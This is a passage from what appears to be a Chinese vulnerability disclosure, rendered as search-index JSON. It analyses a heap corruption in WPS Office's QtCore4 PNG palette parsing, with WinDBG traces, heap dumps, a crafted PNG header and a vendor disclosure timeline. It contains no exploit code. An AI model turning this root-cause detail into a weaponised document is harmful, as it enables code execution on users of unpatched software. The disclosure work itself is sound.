.text:67353321 mov eax, [edx+eax*4+10h] .text:67353325 mov ecx, eax \u4f7f\u7528\u6545\u969c\u8f6c\u50a8\u4e2d\u7684\u4fe1\u606f\uff0c\u6211\u4eec\u77e5\u9053\u5e94\u7528\u7a0b\u5e8f\u5728 0x67353321\uff08\u79fb\u52a8eax\uff0c[edx + eax * 4 + 10h]\uff09 \u5904\u89e6\u53d1\u4e86\u8bbf\u95ee\u51b2\u7a81\u3002\u6211\u4eec\u53ef\u4ee5\u770b\u5230EAX\u5bc4\u5b58\u5668\u75310xc0\u503c\u63a7\u5236\u3002\u56e0\u6b64\uff0c\u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u5bfc\u81f4\u5f02\u5e38\u7684\u6307\u4ee4\u5bf9\u5bc4\u5b58\u5668\u7684\u72b6\u6001\u8fdb\u884c\u4e00\u4e9b\u5047\u8bbe\u3002\u9700\u8981\u6ce8\u610f\u7684\u91cd\u8981\u4e00\u70b9\u662f\uff0c\u5728\u53d1\u751f\u5f02\u5e38\u4e4b\u524d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230ECX\uff080xc0\uff09\u4e2d\u5305\u542b\u7684\u503c\u6b63\u5728\u5199\u5165\u5230\u4ee5\u4e0b\u6307\u4ee4\u6240\u5b9a\u4e49\u7684\u4efb\u610f\u4f4d\u7f6e\uff1a mov ecx, [ebp+arg_0] \u6b64\u5916\uff0c\u6211\u4eec\u6ce8\u610f\u5230\uff0c\u5728\u6211\u4eec\u7684\u6545\u969c\u6307\u4ee4\u4e4b\u5916\uff0cEBP\u7684\u504f\u79fb\u91cf\u5b58\u50a8\u5728ECX\u5bc4\u5b58\u5668\u4e2d\u3002\u6211\u4eec\u5728\u524d\u9762\u63d0\u5230\u7684\u6307\u4ee4\uff08\u504f\u79fb\u91cf\u4e3a0x6ba1331c\uff09\u4e0a\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u65ad\u70b9\uff0c\u4ee5\u89c2\u5bdf\u5185\u5b58\u3002\u65ad\u70b9\u89e6\u53d1\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7b2c\u4e00\u4e2a\u503cc45adfbc\u5f15\u7528\u4e86\u53e6\u4e00\u4e2a\u6307\u9488\uff0c\u8be5\u6307\u9488\u5e94\u8be5\u662f\u6307\u5411\u6570\u7ec4\u7684\u6307\u9488\u3002``` Breakpoint 0 hit eax=0000000f ebx=004f1b40 ecx=d3544100 edx=0000001c esi=d1200e18 edi=0000001c eip=6ba1331c esp=004f1a34 ebp=004f1a34 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202 QtCore4!QMatrix::dy+0x48a3: 6ba1331c 8b4d08 mov ecx,dword ptr [ebp+8] ss:002b:004f1a3c=c45adfbc 0:000> dc ebp+8 004f1a3c c45adfbc 00000048 00000000 6f13830f ..Z.H..........o 004f1a4c 004f5cc8 00000000 00000000 00000000 .\\O............. 004f1a5c 00000000 004f65a0 004f662c 00000000 .....eO.,fO..... 004f1a6c 779eae8e 00000000 00000001 3f800000 ...w...........? 004f1a7c 3f800000 3f31e4f8 3f800000 3f800000 ...?..1?...?...? 004f1a8c 3f800000 3f31e4f8 3f800000 3de38800 ...?..1?...?...= 004f1a9c 3de38800 3d9e1c8a 3c834080 004f3c00 ...=...=.@.<.<O. 004f1aac 4101c71c 6ba13315 3f800000 4081c71c ...A.3.k...?...@ \u4ecec45adfbc\u89c2\u5bdf\u5185\u5b58\u5f15\u7528\uff0c\u53d1\u73b0\u53e6\u4e00\u4e2a\u6307\u9488\u3002\u7b2c\u4e00\u4e2a\u503cab69cf80\u59cb\u7ec8\u8868\u793a\u4e3a\u6307\u5411\u5b83\u6240\u5f15\u7528\u7684\u4efb\u4f55\u5730\u65b9\u7684\u6307\u9488\u3002\u6307\u9488ab69cf80\u57fa\u672c\u4e0a\u662f\u6211\u4eec\u6307\u9488\u7684\u7d22\u5f15\u6570\u7ec4\u3002 0:000> dc c45adfbc c45adfbc ab69cf80 d3544100 00000003 00000280 ..i..AT......... c45adfcc 0000055a 00000012 c0c0c0c0 1c3870e2 Z............p8. c45adfdc 40ad870e 1c3870e2 40ad870e 00000000 ...@.p8....@.... c45adfec 00000000 c0c0c0c1 6c1d12c0 00000000 ...........l.... c45adffc c0c0c0c0 ???????? ???????? ???????? ....???????????? c45ae00c ???????? ???????? ???????? ???????? ???????????????? c45ae01c ???????? ???????? ???????? ???????? ???????????????? c45ae02c ???????? ???????? ???????? ???????? ???????????????? 0:000> dc ab69cf80 ab69cf80 00000001 0000001c 00000010 00000001 ................ // 0000001c is overwritten in the register EDX and EDI before we trigger crash ab69cf90 ff000000 ff800000 ff008000 ff808000 ................ ab69cfa0 ff000080 ff800080 ff008080 ff808080 ................ ab69cfb0 ffc0c0c0 ffff0000 ff00ff00 ffffff00 ................ // ffc0c0c0 where it will be stored in EAX after crash, at the moment it only takes 0xf value in EAX ab69cfc0 ff0000ff ffff00ff ff00ffff ffffffff ................ ab69cfd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ ab69cfe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ ab69cff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ \u56e0\u4e3a\u6211\u4eec\u77e5\u9053\u5d29\u6e83\u7684\u8def\u5f84\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u7b80\u5355\u5730\u8bbe\u7f6e\u4e00\u4e2a\u65ad\u70b9\u3002\u8be5\u547d\u4ee4\u5c06\u83b7\u5f97\u6307\u9488\u503c\u201c edx + eax \\* 4 + 10\u201d\uff0c\u5e76\u68c0\u67e5\u5176\u662f\u5426\u6ee1\u8db30xc0\u3002 bp 6ba13321 \".if (poi(edx+eax*4+10) == 0xc0) {} .else {gc}\" 0:000> g eax=000000c0 ebx=004f1b40 ecx=c45adfbc edx=ab69cf80 esi=d1200e18 edi=0000001c eip=6ba13321 esp=004f1a34 ebp=004f1a34 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202 QtCore4!QMatrix::dy+0x48a8: 6ba13321 8b448210 mov eax,dword ptr [edx+eax*4+10h] ds:002b:ab69d290=???????? \u5982\u679c\u89c2\u5bdf\u5806\u6808\uff0c\u53ef\u4ee5\u770b\u5230\u4ee5\u4e0b\u6267\u884c\uff1a 004f1a38 6ba3cb98 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a74 004f1a3c c45adfbc 004f1a40 00000048 004f1a44 00000000 004f1a48 6f13830f verifier!DphCommitMemoryForPageHeap+0x16f 004f1a4c 004f5cc8 004f1a50 00000000 004f1a54 00000000 004f1a58 00000000 004f1a5c 00000000 004f1a60 004f65a0 004f1a64 004f662c 004f1a68 00000000 004f1a6c 779eae8e ntdll!RtlAllocateHeap+0x3e \u5982\u679c\u6211\u4eec\u53cd\u6c47\u7f166ba3cb98\uff0c\u5219\u53ef\u4ee5\u770b\u5230\u4ee5\u4e0b\u53cd\u6c47\u7f16\u4ee3\u7801\u3002\u771f\u6b63\u7684\u6839\u672c\u539f\u56e0\u5728\u4e8e\u6b64\u4ee3\u7801\u3002 6ba3cb89 8b96b4000000 mov edx,dword ptr [esi+0B4h] 6ba3cb8f 8b4df4 mov ecx,dword ptr [ebp-0Ch] 6ba3cb92 52 push edx 6ba3cb93 8bd7 mov edx,edi 6ba3cb95 ff5580 call dword ptr [ebp-80h] 6ba3cb98 8b4e7c mov ecx,dword ptr [esi+7Ch] C pseudo code grad = (&ptr_grad); if ( grad > 0.0099999998 ) { input_value = grad_size(check, size, input); ptr_grad = (input); ... cut here ... \u6211\u4eec\u57286ba3cb89\u5730\u5740\u4e0a\u8bbe\u7f6e\u65ad\u70b9\uff0c\u5e76\u89c2\u5bdfESI + 0xB4\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u6307\u9488\u6307\u5411\u53e6\u4e00\u4e2a\u4f4d\u7f6e\uff1a 0:000> r eax=00000000 ebx=00791878 ecx=00000005 edx=00793938 esi=cb07de18 edi=0000001c eip=6ba3cb89 esp=00791780 ebp=00791870 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a65: 6ba3cb89 8b96b4000000 mov edx,dword ptr [esi+0B4h] ds:002b:cb07decc=cf69afbc 0:000> dc esi+0B4h cb07decc cf69afbc c0c0c000 00000000 00000100 ..i............. cb07dedc c0c0c0c0 00000000 00000000 00000000 ................ cb07deec 00000000 00000000 00000000 00000000 ................ cb07defc 00000000 cf030fd0 00000000 00000000 ................ cb07df0c 00000000 00000000 00000000 00000000 ................ cb07df1c c0c0c0c0 00000000 3ff00000 00000000 ...........?.... cb07df2c 00000000 00000000 00000000 00000000 ................ cb07df3c 00000000 00000000 3ff00000 00000000 ...........?.... 0:000> dc cf69afbc cf69afbc c88baf80 d1326100 00000003 00000280 .....a2......... cf69afcc 0000055f 00000012 c0c0c0c0 1c3870e2 _............p8. cf69afdc 40ad870e 1c3870e2 40ad870e 00000000 ...@.p8....@.... cf69afec 00000000 c0c0c0c1 6c1d12c0 00000000 ...........l.... cf69affc c0c0c0c0 ???????? ???????? ???????? ....???????????? cf69b00c ???????? ???????? ???????? ???????? ???????????????? cf69b01c ???????? ???????? ???????? ???????? ???????????????? cf69b02c ???????? ???????? ???????? ???????? ???????????????? 0:000> dc c88baf80 c88baf80 00000001 0000001c 00000010 00000001 ................ c88baf90 ff000000 ff800000 ff008000 ff808000 ................ c88bafa0 ff000080 ff800080 ff008080 ff808080 ................ c88bafb0 ffc0c0c0 ffff0000 ff00ff00 ffffff00 ................ c88bafc0 ff0000ff ffff00ff ff00ffff ffffffff ................ c88bafd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ c88bafe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ c88baff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u4ee3\u7801\u5b9e\u9645\u4e0a\u6ca1\u6709\u4ece\u6307\u9488\u91ca\u653e\u4efb\u4f55\u4e1c\u897f\u3002\u4e00\u65e6\u79fb\u81f3EDX\uff0cEDX\u5c06\u4fdd\u7559\u6307\u5411\u7d22\u5f15\u6570\u7ec4\u7684\u6307\u9488\uff1a eax=00000000 ebx=00791878 ecx=00000005 edx=cf69afbc esi=cb07de18 edi=0000001c eip=6ba3cb8f esp=00791780 ebp=00791870 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a6b: 6ba3cb8f 8b4df4 mov ecx,dword ptr [ebp-0Ch] ss:002b:00791864=d1326100 0:000> dc cf69afbc cf69afbc c88baf80 d1326100 00000003 00000280 .....a2......... cf69afcc 0000055f 00000012 c0c0c0c0 1c3870e2 _............p8. cf69afdc 40ad870e 1c3870e2 40ad870e 00000000 ...@.p8....@.... cf69afec 00000000 c0c0c0c1 6c1d12c0 00000000 ...........l.... cf69affc c0c0c0c0 ???????? ???????? ???????? ....???????????? cf69b00c ???????? ???????? ???????? ???????? ???????????????? cf69b01c ???????? ???????? ???????? ???????? ???????????????? cf69b02c ???????? ???????? ???????? ???????? ???????????????? 0:000> dc c88baf80 c88baf80 00000001 0000001c 00000010 00000001 ................ c88baf90 ff000000 ff800000 ff008000 ff808000 ................ c88bafa0 ff000080 ff800080 ff008080 ff808080 ................ c88bafb0 ffc0c0c0 ffff0000 ff00ff00 ffffff00 ................ c88bafc0 ff0000ff ffff00ff ff00ffff ffffffff ................ c88bafd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ c88bafe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ c88baff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ \u5d29\u6e83\u540e\u7684\u5806\u6808\u8ddf\u8e2a\uff1a 0:000> kvL # ChildEBP RetAddr Args to Child 00 012f18d4 6ba3cb98 cc53afbc 00000048 00000000 QtCore4!QMatrix::dy+0x48a8 01 012f19d0 6b8143ef 00000000 012f1b78 012f1a5c QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a74 02 012f1a30 6b814259 0000002e 012f5bd0 00000000 QtCore4!QBrush::setMatrix+0x234 03 012f5b14 6b8249a4 0000003b 012f5b68 cc780e18 QtCore4!QBrush::setMatrix+0x9e 04 012f5b2c 6b80cc84 0000003b 012f5b68 cc780e18 QtCore4!QImage::rect+0x22b 05 012f5b48 6b857ccc 0000003b 012f5b68 cc780e18 QtCore4!QTransform::inverted+0xec8 06 012f64dc 6b81c55b 00000000 003c0000 00000000 QtCore4!QSvgFillStyle::setFillOpacity+0x1b59 07 012f66c0 6b896844 012f6724 cc818ff0 0000001c QtCore4!QPainter::drawPixmap+0x1c98 08 012f67b4 6d1e0fbd 012f69ec 012f66d4 012f6864 QtCore4!QPainter::drawImage+0x325 09 012f67d4 6d0dd155 012f6a54 012f69ec 012f6864 kso!GdiDrawHoriLineIAlt+0x11a1a 0a 012f67ec 6d0c8d88 012f69ec 012f68e0 012f6864 kso!kpt::PainterExt::drawBitmap+0x23 \u5806\u5206\u6790\uff1a 0:000> !heap -p -a cc53afbc address cc53afbc found in _DPH_HEAP_ROOT @ 6731000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) cc36323c: cc53afa8 58 - cc53a000 2000 6f13ab70 verifier!AVrfDebugPageHeapAllocate+0x00000240 77a9909b ntdll!RtlDebugAllocateHeap+0x00000039 779ebbad ntdll!RtlpAllocateHeap+0x000000ed 779eb0cf ntdll!RtlpAllocateHeapInternal+0x0000022f 779eae8e ntdll!RtlAllocateHeap+0x0000003e 6f080269 MSVCR100!malloc+0x0000004b 6f08233b MSVCR100!operator new+0x0000001f 6b726c67 QtCore4!QImageData::create+0x000000fa 6b726b54 QtCore4!QImage::QImage+0x0000004e 6b7a0e21 QtCore4!png_get_text+0x00000436 6b79d7a8 QtCore4!QImageIOHandler::setFormat+0x000000de 6b79d457 QtCore4!QPixmapData::fromFile+0x000002bf 6b725eb4 QtCore4!QImageReader::read+0x000001e2 6d0ca585 kso!kpt::VariantImage::forceUpdateCacheImage+0x0000254e 6d0c5964 kso!kpt::Direct2DPaintEngineHelper::operator=+0x00000693 6d0c70d0 kso!kpt::RelativeRect::unclipped+0x00001146 6d0c8d0c kso!kpt::VariantImage::forceUpdateCacheImage+0x00000cd5 6d451d5c kso!BlipCacheMgr::BrushCache+0x0000049a 6d451e85 kso!BlipCacheMgr::GenerateBitmap+0x0000001d 6d453227 kso!BlipCacheMgr::GenCachedBitmap+0x00000083 6d29bb92 kso!drawing::PictureRenderLayer::render+0x000009b6 6d450fb1 kso!drawing::RenderTargetImpl::paint+0x00000090 6d29b528 kso!drawing::PictureRenderLayer::render+0x0000034c 6d2a2d83 kso!drawing::VisualRenderer::render+0x00000060 6d2b8970 kso!drawing::SingleVisualRenderer::drawNormal+0x000002b5 6d2b86a7 kso!drawing::SingleVisualRenderer::draw+0x000001e1 6d2b945e kso!drawing::SingleVisualRenderer::draw+0x00000046 6d3d0142 kso!drawing::ShapeVisual::paintEvent+0x0000044a 680a2b5c wpsmain!WpsShapeTreeVisual::getHittestSubVisuals+0x000068f1 6d0e36df kso!AbstractVisual::visualEvent+0x00000051 6d3cbe97 kso!drawing::ShapeVisual::visualEvent+0x0000018f 6d0eba90 kso!VisualPaintEvent::arriveVisual+0x0000004e 0:000> dt _DPH_BLOCK_INFORMATION cc780e18-0x20 verifier!_DPH_BLOCK_INFORMATION +0x000 StartStamp : 0xc0c0c0c0 +0x004 Heap : 0xc0c0c0c0 Void +0x008 RequestedSize : 0xc0c0c0c0 +0x00c ActualSize : 0xc0c0c0c0 +0x010 Internal : _DPH_BLOCK_INTERNAL_INFORMATION +0x018 StackTrace : 0xc0c0c0c0 Void +0x01c EndStamp : 0xc0c0c0c0 \u6bb5\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5806\u6761\u76ee\u901a\u5e38\u662f\u4e00\u4e2a\u7a7a\u95f2\u5757\u3002\u5806\u5757\u7684\u72b6\u6001\u6307\u793a\u4e3a\u7a7a\u95f2\u5757\u3002\u5806\u5757\u58f0\u660e\u524d\u4e00\u4e2a\u5757\u7684\u5927\u5c0f\u4e3a00108\uff0c\u800c\u5f53\u524d\u5757\u7684\u5927\u5c0f\u4e3a00a30\u3002\u524d\u4e00\u5757\u62a5\u544a\u5176\u81ea\u8eab\u5927\u5c0f\u4e3a0x20\u5b57\u8282\uff0c\u4e0d\u5339\u914d\u3002\u4f4d\u7f6e\u4e3a05f61000\u7684\u5806\u5757\u7684\u4f7f\u7528\u4f3c\u4e4e\u662f\u8be5\u5806\u5757\u7684\u4f7f\u7528\u5bfc\u81f4\u4ee5\u4e0b\u5757\u7684\u5143\u6570\u636e\u635f\u574f\u7684\u53ef\u80fd\u6027\u3002\u5806\u5757\uff1a 0:000> !heap -a 05f60000 Index Address Name Debugging options enabled 1: 05f60000 Segment at 05f60000 to 0605f000 (00001000 bytes committed) Flags: 00000002 ForceFlags: 00000000 Granularity: 8 bytes Segment Reserve: 00100000 Segment Commit: 00002000 DeCommit Block Thres: 00000200 DeCommit Total Thres: 00002000 Total Free Size: 00000146 Max. Allocation Size: fffdefff Lock Variable at: 05f60258 Next TagIndex: 0000 Maximum TagIndex: 0000 Tag Entries: 00000000 PsuedoTag Entries: 00000000 Virtual Alloc List: 05f6009c Uncommitted ranges: 05f6008c 05f61000: 000fe000 (1040384 bytes) FreeList[ 00 ] at 05f600c0: 05f605b8 . 05f605b8 05f605b0: 00108 . 00a30 [100] - free Segment00 at 05f60000: Flags: 00000000 Base: 05f60000 First Entry: 05f604a8 Last Entry: 0605f000 Total Pages: 000000ff Total UnCommit: 000000fe Largest UnCommit:00000000 UnCommitted Ranges: (1) Heap entries for Segment00 in Heap 05f60000 address: psize . size flags state (requested size) 05f60000: 00000 . 004a8 [101] - busy (4a7) 05f604a8: 004a8 . 00108 [101] - busy (107) Internal 05f605b0: 00108 . 00a30 [100] 05f60fe0: 00a30 . 00020 [111] - busy (1d) 05f61000: 000fe000 - uncommitted bytes. 0:000> dd 05f60fe0 05f60fe0 a9b3c836 03007087 05f6008c 05f6008c 05f60ff0 05f60038 05f60038 05f61000 000fe000 05f61000 ???????? ???????? ???????? ???????? 05f61010 ???????? ???????? ???????? ???????? 05f61020 ???????? ???????? ???????? ???????? 05f61030 ???????? ???????? ???????? ???????? 05f61040 ???????? ???????? ???????? ???????? 05f61050 ???????? ???????? ???????? ???????? ``` \u62ab\u9732\u65f6\u95f4\u8868 \u00b6 \u8be5\u6f0f\u6d1e\u4e8e2020\u5e748\u6708\u62a5\u544a\u3002\u62ab\u9732\u65f6\u95f4\u8868\uff1a 2020-08-04-\u5c06\u7535\u5b50\u90ae\u4ef6\u53d1\u9001\u5230\u516c\u5f00\u63d0\u4f9b\u7684WPS\u7684\u5404\u79cd\u90ae\u4ef6\u5217\u8868\uff08\u9500\u552e\u548c\u652f\u6301\uff09\u3002 2020-08-10-WPS\u56e2\u961f\u56de\u5e94\u8be5\u62a5\u544a\u53ef\u4ee5\u8f6c\u53d1\u7ed9\u4ed6\u4eec\u3002 2020-08-11-\u8981\u6c42\u8fdb\u4e00\u6b65\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u54a8\u8be2\u548c\u5411\u9002\u5f53\u7684\u6e20\u9053\u62ab\u9732\u7b49\u3002 2020-08-17-\u6839\u636e\u5148\u524d\u7684\u8981\u6c42\u4e0eWPS\u56e2\u961f\u8fdb\u884c\u8ddf\u8fdb\u3002 2020-08-18-WPS\u56e2\u961f\u505a\u51fa\u56de\u5e94\uff0c\u4ed6\u4eec\u4f1a\u7167\u987e\u597d\u5b83\uff0c\u5e76\u8f6c\u4ea4\u7ed9\u5f00\u53d1\u56e2\u961f\u3002 2020-08-18-\u901a\u8fc7\u7535\u5b50\u90ae\u4ef6\u63d0\u4f9b\u6280\u672f\u62a5\u544a\u548c\u6982\u5ff5\u9a8c\u8bc1\uff08\u672a\u52a0\u5bc6\uff09\u3002 2020-08-25-WPS\u8ddf\u8fdb\u62a5\u544a\u8fdb\u5ea6\u3002 2020-08-26-WPS\u66f4\u65b0\u8bf4\u6b64\u95ee\u9898\u5df2\u8f6c\u53d1\u7ed9\u5f00\u53d1\u56e2\u961f\u3002 2020-08-28-WPS\u53d1\u9001\u4e86\u4e00\u5c01\u7535\u5b50\u90ae\u4ef6\uff0c\u6307\u51fa\u8be5\u95ee\u9898\u5df2\u5728\u6700\u65b0\u7684\u4e0b\u8f7d\u7248\u672c11.2.0.9403\u4e2d\u5f97\u5230\u89e3\u51b3\u3002 2020-08-28-\u9488\u5bf9\u63d0\u4f9b\u7684PoC\u6d4b\u8bd5\u4e86\u65b0\u7248\u672c\uff0c\u5e76\u786e\u8ba4\u95ee\u9898\u5df2\u89e3\u51b3\u3002 2020-08-28-\u5411WPS\u56e2\u961f\u5bfb\u6c42\u54a8\u8be2\u6216\u66f4\u6539\u65e5\u5fd7\u66f4\u65b0\u3002 2020-08-31-WPS\u56e2\u961f\u901a\u77e5\u4ed6\u4eec\u4e0d\u518d\u66f4\u65b0\u6216\u7ef4\u62a4\u4efb\u4f55\u5b89\u5168\u516c\u544a\u3002 2020-09-03-\u6f0f\u6d1e\u5199\u4fe1 \u8981\u6c42CVE\u3002","title":"\u91d1\u5c71WPS Office\u8fdc\u7a0b\u5806\u635f\u574f\u6f0f\u6d1e\u5bfc\u81f4\u4ee3\u7801\u6267\u884c"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E9%87%91%E5%B1%B1WPS%20Office%E8%BF%9C%E7%A8%8B%E5%A0%86%E6%8D%9F%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_1","text":"WPS Office\u662f\u7531Microsoft\u73e0\u6d77\u7684\u4e2d\u56fd\u8f6f\u4ef6\u5f00\u53d1\u5546\u91d1\u5c71\u8f6f\u4ef6\u5f00\u53d1\u7684\u529e\u516c\u5957\u4ef6\uff0c\u9002\u7528\u4e8eMicrosoft Windows\uff0cmacOS\uff0cLinux\uff0ciOS\u548cAndroid\u3002WPS Office\u7531\u4e09\u4e2a\u4e3b\u8981\u7ec4\u4ef6\u7ec4\u6210\uff1aWPS Writer\uff0cWPS Presentation\u548cWPS Spreadsheet\u3002\u4e2a\u4eba\u57fa\u672c\u7248\u672c\u53ef\u4ee5\u514d\u8d39\u4f7f\u7528\u3002WPS Office\u8f6f\u4ef6\u4e2d\u5b58\u5728\u4e00\u4e2a\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\uff0c\u662f\u5f53Office\u8f6f\u4ef6\u5728\u5206\u6790\u7279\u5236Office\u6587\u4ef6\u65f6\u4e0d\u6b63\u786e\u5730\u5904\u7406\u5185\u5b58\u4e2d\u7684\u5bf9\u8c61\u65f6\u5f15\u8d77\u7684\u3002\u6210\u529f\u5229\u7528\u6b64\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u5f53\u524d\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u4efb\u610f\u4ee3\u7801\u3002\u6545\u969c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u3002\u6f0f\u6d1e\u4ea7\u54c1WPS Office\uff0c\u5f71\u54cd\u7248\u672c11.2.0.9453\u3002","title":"\u603b\u89c8"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E9%87%91%E5%B1%B1WPS%20Office%E8%BF%9C%E7%A8%8B%E5%A0%86%E6%8D%9F%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_2","text":"\u5728WPS Office\u4e2d\u7528\u4e8e\u56fe\u50cf\u683c\u5f0f\u89e3\u6790\u7684Qt\u6a21\u5757\u4e2d\u53d1\u73b0\u5806\u635f\u574f\u3002\u5d4c\u5165WPS office\u7684\u7279\u5236\u56fe\u50cf\u6587\u4ef6\u53ef\u80fd\u4f1a\u89e6\u53d1\u6b64\u6f0f\u6d1e\u3002\u6253\u5f00\u7279\u5236\u7684\u6587\u6863\u6587\u4ef6\u65f6\uff0c\u89e6\u53d1\u8bbf\u95ee\u51b2\u7a81\u3002EDX\u6307\u5411\u6570\u7ec4\u7684\u6307\u9488\uff0c\u800cEAX\u662f\u6307\u5411\u6570\u7ec4\u7684\u7d22\u5f15\u3002 0:000> g (c50.b4): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=000000c0 ebx=006f1c48 ecx=cd2aefbc edx=cd2c6f80 esi=2ed7ae18 edi=0000001c eip=6ba13321 esp=006f1b44 ebp=006f1b44 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00210202 QtCore4!QMatrix::dy+0x48a8: 6ba13321 8b448210 mov eax,dword ptr [edx+eax*4+10h] ds:002b:cd2c7290=???????? \u5d29\u6e83\u662f\u5982\u4f55\u89e6\u53d1\u7684\uff1f\u8ba9\u6211\u4eec\u770b\u4e00\u4e0bPNG\u6807\u5934\u683c\u5f0f\u3002 00029E30 FF 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 \u00ff\u2030PNG........IHD 00029E40 52 00 00 02 80 00 00 01 C6 04 03 00 00 00 16 0A R...\u20ac...\u00c6....... 00029E50 27 FC 00 00 00 04 67 41 4D 41 00 00 B1 88 95 98 '\u00fc....gAMA..\u00b1\u02c6\u2022\u02dc 00029E60 F4 A6 00 00 00 30 50 4C 54 45 00 00 00 80 00 00 \u00f4\u00a6...0PLTE...\u20ac.. 00029E70 00 80 00 80 80 00 00 00 80 80 00 80 00 80 80 80 .\u20ac.\u20ac\u20ac...\u20ac\u20ac.\u20ac.\u20ac\u20ac\u20ac 00029E80 80 80 C0 C0 C0 FF 00 00 00 FF 00 FF FF 00 00 00 \u20ac\u20ac\u00c0\u00c0\u00c0\u00ff...\u00ff.\u00ff\u00ff... 00029E90 FF FF 00 FF 00 FF FF FF FF FF 7B 1F B1 C4 00 00 \u00ff\u00ff.\u00ff.\u00ff\u00ff\u00ff\u00ff\u00ff{.\u00b1\u00c4.. \u4ece\u504f\u79fb\u91cf0x29E31\u5f00\u59cb-0x29E34\u662fPNG\u6587\u4ef6\u683c\u5f0f\u7684\u7b7e\u540d\u6807\u5934\u3002PNG\u5934\u6587\u4ef6\u7684\u7ed3\u6784\uff1a PNG signature --> IHDR --> gAMA --> PLTE --> pHYs --> IDAT --> IEND \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5f53WPS Office Suite\u4e2d\u4f7f\u7528\u7684QtCore\u5e93\u89e3\u6790PLTE\u7ed3\u6784\u5e76\u89e6\u53d1\u5806\u7834\u574f\u65f6\uff0c\u8be5\u6f0f\u6d1e\u4f4d\u4e8eWord\u6587\u6863\u4e2d\u7684\u5d4c\u5165\u5f0fPNG\u6587\u4ef6\u4e2d\u3002\u5728\u504f\u79fb\u91cf0x29E82\u52300x29E85\u5904\uff0c\u8c03\u8272\u677f\u7684\u89e3\u6790\u5931\u8d25\uff0c\u4ece\u800c\u89e6\u53d1\u4e86\u5806\u4e2d\u7684\u5185\u5b58\u635f\u574f\u3002\u5d29\u6e83\u89e6\u53d1\u4e4b\u524d\u7684\u5806\u6808\u8ddf\u8e2a\uff1a 00 00ee1790 6b8143ef QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a71 01 00ee17f0 6b814259 QtCore4!QBrush::setMatrix+0x234 02 00ee58d4 6b8249a4 QtCore4!QBrush::setMatrix+0x9e 03 00ee58ec 6b80cc84 QtCore4!QImage::rect+0x22b 04 00ee5908 6b857ccc QtCore4!QTransform::inverted+0xec8 05 00ee629c 6b81c55b QtCore4!QSvgFillStyle::setFillOpacity+0x1b59 06 00ee6480 6b896844 QtCore4!QPainter::drawPixmap+0x1c98 07 00ee6574 6d1e0fbd QtCore4!QPainter::drawImage+0x325 08 00ee6594 6d0dd155 kso!GdiDrawHoriLineIAlt+0x11a1a \u5728QtCore4\u89e3\u6790\u5d4c\u5165\u5f0f\u56fe\u50cf\u4e4b\u524d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6765\u81eaKSO\u6a21\u5757\u7684\u6700\u540e\u4e00\u6b21\u8c03\u7528\uff0c\u8bd5\u56fe\u5904\u7406\u56fe\u50cfkso\uff01GdiDrawHoriLineIAlt\u3002\u4f7f\u7528IDA Pro\u5206\u89e3\u5e94\u7528\u7a0b\u5e8f\u6765\u5206\u6790\u53d1\u751f\u5f02\u5e38\u7684\u529f\u80fd\u3002\u6700\u540e\u7684\u5d29\u6e83\u8def\u5f84\u5982\u4e0b\uff08WinDBG\u7ed3\u679c\uff09\uff1a QtCore4!QMatrix::dy+0x48a8: 6ba13321 8b448210 mov eax,dword ptr 